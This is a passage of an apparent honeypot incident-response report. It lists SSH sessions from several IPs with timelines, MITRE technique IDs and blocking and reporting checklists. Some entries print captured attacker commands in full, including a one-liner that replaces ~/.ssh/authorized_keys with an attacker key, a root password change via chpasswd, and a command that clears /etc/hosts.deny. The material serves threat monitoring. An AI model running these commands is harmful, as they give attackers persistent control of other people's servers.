- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f50c6f3a3eef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 06:19 |
| **Last Seen** | 2026-07-05 06:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:19:34` | `cowrie.session.connect` |
| `2026-07-05 06:19:35` | `cowrie.client.version` |
| `2026-07-05 06:19:35` | `cowrie.client.kex` |
| `2026-07-05 06:19:38` | `cowrie.login.success` |
| `2026-07-05 06:19:40` | `cowrie.session.params` |
| `2026-07-05 06:19:40` | `cowrie.command.input` |
| `2026-07-05 06:19:40` | `cowrie.command.input` |
| `2026-07-05 06:19:40` | `cowrie.command.input` |
| `2026-07-05 06:19:40` | `cowrie.command.input` |
| `2026-07-05 06:19:40` | `cowrie.command.input` |
| `2026-07-05 06:19:40` | `cowrie.command.success` |
| `2026-07-05 06:19:40` | `cowrie.command.input` |
| `2026-07-05 06:19:40` | `cowrie.command.input` |
| `2026-07-05 06:19:40` | `cowrie.command.input` |
| `2026-07-05 06:19:40` | `cowrie.command.input` |
| `2026-07-05 06:19:42` | `cowrie.log.closed` |
| `2026-07-05 06:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b205962fc9ca

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-07-05 06:19 |
| **Last Seen** | 2026-07-05 06:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:19:34` | `cowrie.session.connect` |
| `2026-07-05 06:19:34` | `cowrie.client.version` |
| `2026-07-05 06:19:34` | `cowrie.client.kex` |
| `2026-07-05 06:19:35` | `cowrie.login.success` |
| `2026-07-05 06:19:35` | `cowrie.session.params` |
| `2026-07-05 06:19:35` | `cowrie.command.input` |
| `2026-07-05 06:19:35` | `cowrie.command.failed` |
| `2026-07-05 06:19:36` | `cowrie.log.closed` |
| `2026-07-05 06:19:36` | `cowrie.session.params` |
| `2026-07-05 06:19:36` | `cowrie.command.input` |
| `2026-07-05 06:19:36` | `cowrie.session.file_download` |
| `2026-07-05 06:19:36` | `cowrie.log.closed` |
| `2026-07-05 06:19:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d6360f8e056

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-07-05 06:19 |
| **Last Seen** | 2026-07-05 06:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:19:37` | `cowrie.session.connect` |
| `2026-07-05 06:19:37` | `cowrie.client.version` |
| `2026-07-05 06:19:37` | `cowrie.client.kex` |
| `2026-07-05 06:19:37` | `cowrie.login.success` |
| `2026-07-05 06:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eed6b82cd601

| Field | Detail |
|---|---|
| **Source IP** | `217.154.38[.]181` |
| **First Seen** | 2026-07-05 06:19 |
| **Last Seen** | 2026-07-05 06:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:19:37` | `cowrie.session.connect` |
| `2026-07-05 06:19:37` | `cowrie.client.version` |
| `2026-07-05 06:19:37` | `cowrie.client.kex` |
| `2026-07-05 06:19:38` | `cowrie.login.success` |
| `2026-07-05 06:19:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.38[.]181` to AbuseIPDB if not already reported
- [ ] Block `217.154.38[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2a371e84d2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-05 06:19 |
| **Last Seen** | 2026-07-05 06:19 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:19:42` | `cowrie.session.connect` |
| `2026-07-05 06:19:43` | `cowrie.client.version` |
| `2026-07-05 06:19:43` | `cowrie.client.kex` |
| `2026-07-05 06:19:51` | `cowrie.login.success` |
| `2026-07-05 06:19:55` | `cowrie.session.params` |
| `2026-07-05 06:19:55` | `cowrie.command.input` |
| `2026-07-05 06:19:55` | `cowrie.command.input` |
| `2026-07-05 06:19:55` | `cowrie.command.input` |
| `2026-07-05 06:19:55` | `cowrie.command.input` |
| `2026-07-05 06:19:55` | `cowrie.command.input` |
| `2026-07-05 06:19:55` | `cowrie.command.success` |
| `2026-07-05 06:19:55` | `cowrie.command.input` |
| `2026-07-05 06:19:55` | `cowrie.command.input` |
| `2026-07-05 06:19:55` | `cowrie.command.input` |
| `2026-07-05 06:19:55` | `cowrie.command.input` |
| `2026-07-05 06:19:57` | `cowrie.log.closed` |
| `2026-07-05 06:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a9201c20860

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 06:21 |
| **Last Seen** | 2026-07-05 06:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:21:42` | `cowrie.session.connect` |
| `2026-07-05 06:21:43` | `cowrie.client.version` |
| `2026-07-05 06:21:43` | `cowrie.client.kex` |
| `2026-07-05 06:21:49` | `cowrie.login.success` |
| `2026-07-05 06:21:53` | `cowrie.session.params` |
| `2026-07-05 06:21:53` | `cowrie.command.input` |
| `2026-07-05 06:21:54` | `cowrie.log.closed` |
| `2026-07-05 06:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ec5e86d478f

| Field | Detail |
|---|---|
| **Source IP** | `201.249.192[.]30` |
| **First Seen** | 2026-07-05 06:30 |
| **Last Seen** | 2026-07-05 06:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:30:37` | `cowrie.session.connect` |
| `2026-07-05 06:30:37` | `cowrie.client.version` |
| `2026-07-05 06:30:37` | `cowrie.client.kex` |
| `2026-07-05 06:30:37` | `cowrie.login.success` |
| `2026-07-05 06:30:38` | `cowrie.session.params` |
| `2026-07-05 06:30:38` | `cowrie.command.input` |
| `2026-07-05 06:30:38` | `cowrie.command.failed` |
| `2026-07-05 06:30:38` | `cowrie.log.closed` |
| `2026-07-05 06:30:39` | `cowrie.session.params` |
| `2026-07-05 06:30:39` | `cowrie.command.input` |
| `2026-07-05 06:30:39` | `cowrie.session.file_download` |
| `2026-07-05 06:30:39` | `cowrie.log.closed` |
| `2026-07-05 06:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.192[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.249.192[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cad0db43dd8

| Field | Detail |
|---|---|
| **Source IP** | `201.249.192[.]30` |
| **First Seen** | 2026-07-05 06:30 |
| **Last Seen** | 2026-07-05 06:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:30:39` | `cowrie.session.connect` |
| `2026-07-05 06:30:39` | `cowrie.client.version` |
| `2026-07-05 06:30:39` | `cowrie.client.kex` |
| `2026-07-05 06:30:40` | `cowrie.login.success` |
| `2026-07-05 06:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.192[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.249.192[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3749efb9d8d7

| Field | Detail |
|---|---|
| **Source IP** | `201.249.192[.]30` |
| **First Seen** | 2026-07-05 06:30 |
| **Last Seen** | 2026-07-05 06:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:30:40` | `cowrie.session.connect` |
| `2026-07-05 06:30:40` | `cowrie.client.version` |
| `2026-07-05 06:30:40` | `cowrie.client.kex` |
| `2026-07-05 06:30:40` | `cowrie.login.success` |
| `2026-07-05 06:30:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.249.192[.]30` to AbuseIPDB if not already reported
- [ ] Block `201.249.192[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf428b3aa386

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 06:32 |
| **Last Seen** | 2026-07-05 06:32 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:32:31` | `cowrie.session.connect` |
| `2026-07-05 06:32:32` | `cowrie.client.version` |
| `2026-07-05 06:32:32` | `cowrie.client.kex` |
| `2026-07-05 06:32:38` | `cowrie.login.success` |
| `2026-07-05 06:32:41` | `cowrie.session.params` |
| `2026-07-05 06:32:41` | `cowrie.command.input` |
| `2026-07-05 06:32:42` | `cowrie.log.closed` |
| `2026-07-05 06:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e419f344df5a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.84[.]131` |
| **First Seen** | 2026-07-05 06:34 |
| **Last Seen** | 2026-07-05 06:35 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:OhFYOuINya4x"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:34:16` | `cowrie.session.connect` |
| `2026-07-05 06:34:18` | `cowrie.client.version` |
| `2026-07-05 06:34:18` | `cowrie.client.kex` |
| `2026-07-05 06:34:19` | `cowrie.login.success` |
| `2026-07-05 06:34:21` | `cowrie.session.params` |
| `2026-07-05 06:34:21` | `cowrie.command.input` |
| `2026-07-05 06:34:21` | `cowrie.command.failed` |
| `2026-07-05 06:34:21` | `cowrie.log.closed` |
| `2026-07-05 06:34:22` | `cowrie.session.params` |
| `2026-07-05 06:34:22` | `cowrie.command.input` |
| `2026-07-05 06:34:22` | `cowrie.session.file_download` |
| `2026-07-05 06:34:22` | `cowrie.log.closed` |
| `2026-07-05 06:34:51` | `cowrie.session.params` |
| `2026-07-05 06:34:51` | `cowrie.command.input` |
| `2026-07-05 06:34:52` | `cowrie.log.closed` |
| `2026-07-05 06:34:52` | `cowrie.session.params` |
| `2026-07-05 06:34:52` | `cowrie.command.input` |
| `2026-07-05 06:34:53` | `cowrie.log.closed` |
| `2026-07-05 06:34:54` | `cowrie.session.params` |
| `2026-07-05 06:34:54` | `cowrie.command.input` |
| `2026-07-05 06:34:54` | `cowrie.session.file_download` |
| `2026-07-05 06:34:54` | `cowrie.log.closed` |
| `2026-07-05 06:34:55` | `cowrie.session.params` |
| `2026-07-05 06:34:55` | `cowrie.command.input` |
| `2026-07-05 06:34:56` | `cowrie.log.closed` |
| `2026-07-05 06:34:57` | `cowrie.session.params` |
| `2026-07-05 06:34:57` | `cowrie.command.input` |
| `2026-07-05 06:34:57` | `cowrie.log.closed` |
| `2026-07-05 06:34:59` | `cowrie.session.params` |
| `2026-07-05 06:34:59` | `cowrie.command.input` |
| `2026-07-05 06:34:59` | `cowrie.command.input` |
| `2026-07-05 06:35:00` | `cowrie.log.closed` |
| `2026-07-05 06:35:01` | `cowrie.session.params` |
| `2026-07-05 06:35:01` | `cowrie.command.input` |
| `2026-07-05 06:35:02` | `cowrie.log.closed` |
| `2026-07-05 06:35:02` | `cowrie.session.params` |
| `2026-07-05 06:35:02` | `cowrie.command.input` |
| `2026-07-05 06:35:03` | `cowrie.log.closed` |
| `2026-07-05 06:35:04` | `cowrie.session.params` |
| `2026-07-05 06:35:04` | `cowrie.command.input` |
| `2026-07-05 06:35:05` | `cowrie.log.closed` |
| `2026-07-05 06:35:05` | `cowrie.session.params` |
| `2026-07-05 06:35:05` | `cowrie.command.input` |
| `2026-07-05 06:35:07` | `cowrie.log.closed` |
| `2026-07-05 06:35:07` | `cowrie.session.params` |
| `2026-07-05 06:35:07` | `cowrie.command.input` |
| `2026-07-05 06:35:08` | `cowrie.log.closed` |
| `2026-07-05 06:35:09` | `cowrie.session.params` |
| `2026-07-05 06:35:09` | `cowrie.command.input` |
| `2026-07-05 06:35:09` | `cowrie.log.closed` |
| `2026-07-05 06:35:10` | `cowrie.session.params` |
| `2026-07-05 06:35:10` | `cowrie.command.input` |
| `2026-07-05 06:35:11` | `cowrie.log.closed` |
| `2026-07-05 06:35:12` | `cowrie.session.params` |
| `2026-07-05 06:35:12` | `cowrie.command.input` |
| `2026-07-05 06:35:12` | `cowrie.log.closed` |
| `2026-07-05 06:35:13` | `cowrie.session.params` |
| `2026-07-05 06:35:13` | `cowrie.command.input` |
| `2026-07-05 06:35:13` | `cowrie.log.closed` |
| `2026-07-05 06:35:14` | `cowrie.session.params` |
| `2026-07-05 06:35:14` | `cowrie.command.input` |
| `2026-07-05 06:35:14` | `cowrie.log.closed` |
| `2026-07-05 06:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.84[.]131` to AbuseIPDB if not already reported
- [ ] Block `120.48.84[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5408ed65fdc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-05 06:34 |
| **Last Seen** | 2026-07-05 06:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:34:46` | `cowrie.session.connect` |
| `2026-07-05 06:34:46` | `cowrie.client.version` |
| `2026-07-05 06:34:46` | `cowrie.client.kex` |
| `2026-07-05 06:34:46` | `cowrie.login.success` |
| `2026-07-05 06:34:46` | `cowrie.direct-tcpip.request` |
| `2026-07-05 06:34:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-05 06:34:46` | `cowrie.direct-tcpip.data` |
| `2026-07-05 06:34:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ee2f9819c91

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-05 06:34 |
| **Last Seen** | 2026-07-05 06:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:34:46` | `cowrie.session.connect` |
| `2026-07-05 06:34:46` | `cowrie.client.version` |
| `2026-07-05 06:34:47` | `cowrie.client.kex` |
| `2026-07-05 06:34:47` | `cowrie.login.success` |
| `2026-07-05 06:34:47` | `cowrie.direct-tcpip.request` |
| `2026-07-05 06:34:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-05 06:34:47` | `cowrie.direct-tcpip.data` |
| `2026-07-05 06:34:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99a8f16e370

| Field | Detail |
|---|---|
| **Source IP** | `45.33.14[.]5` |
| **First Seen** | 2026-07-05 06:36 |
| **Last Seen** | 2026-07-05 06:39 |
| **Session Duration** | 180s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `9b` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:36:09` | `cowrie.session.connect` |
| `2026-07-05 06:36:09` | `cowrie.login.success` |
| `2026-07-05 06:36:10` | `cowrie.session.params` |
| `2026-07-05 06:36:16` | `cowrie.command.input` |
| `2026-07-05 06:36:16` | `cowrie.command.failed` |
| `2026-07-05 06:39:10` | `cowrie.log.closed` |
| `2026-07-05 06:39:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.14[.]5` to AbuseIPDB if not already reported
- [ ] Block `45.33.14[.]5` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9dbfdfc2fe0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 06:43 |
| **Last Seen** | 2026-07-05 06:43 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:43:31` | `cowrie.session.connect` |
| `2026-07-05 06:43:33` | `cowrie.client.version` |
| `2026-07-05 06:43:33` | `cowrie.client.kex` |
| `2026-07-05 06:43:39` | `cowrie.login.success` |
| `2026-07-05 06:43:43` | `cowrie.session.params` |
| `2026-07-05 06:43:43` | `cowrie.command.input` |
| `2026-07-05 06:43:45` | `cowrie.log.closed` |
| `2026-07-05 06:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5a0a3438eb5

| Field | Detail |
|---|---|
| **Source IP** | `5.253.59[.]254` |
| **First Seen** | 2026-07-05 06:43 |
| **Last Seen** | 2026-07-05 06:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:43:43` | `cowrie.session.connect` |
| `2026-07-05 06:43:43` | `cowrie.client.version` |
| `2026-07-05 06:43:43` | `cowrie.client.kex` |
| `2026-07-05 06:43:43` | `cowrie.login.success` |
| `2026-07-05 06:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.253.59[.]254` to AbuseIPDB if not already reported
- [ ] Block `5.253.59[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6664a22d193b

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-05 06:43 |
| **Last Seen** | 2026-07-05 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 06:43:44` | `cowrie.session.connect` |
| `2026-07-05 06:43:44` | `cowrie.client.version` |
| `2026-07-05 06:43:44` | `cowrie.client.kex` |
| `2026-07-05 06:43:44` | `cowrie.login.success` |
| `2026-07-05 06:43:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48a94b221ed8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.3[.]128` |
| **First Seen** | 2026-07-05 06:52 |
| **Last Seen** | 2026-07-05 06:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
